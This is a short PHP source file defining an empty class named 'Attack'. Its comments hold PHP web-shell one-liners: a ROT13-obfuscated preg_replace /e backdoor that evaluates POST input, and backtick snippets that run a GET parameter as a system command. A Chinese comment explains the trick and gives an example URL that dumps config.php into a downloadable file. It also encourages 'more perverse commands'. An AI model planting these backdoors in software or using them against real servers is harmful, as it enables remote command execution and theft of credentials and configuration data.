<?php 
namespace Zodream\Domain;
/**
 * 攻击
 *
 * @author Jason
 * @time 2015-12-1
 */
class Attack {
	
	//preg_replace("/[errorpage]/e",@str_rot13('@nffreg($_CBFG[cntr]);'),"saft");
	
	//$c=urldecode($_GET['c']);if($c){`$c`;}//完整
	//!$_GET['c']||`{$_GET['c']}`;//精简
	/*******************************************************
	 * 原理：PHP中``符号包含会当作系统命令执行
	 * 示例：http://host/?c=type%20config.php>config.txt
	 *       然后就可以下载config.txt查看内容了！
	 *       可以试试更变态的命令，不要干坏事哦！
	 *******************************************************/
}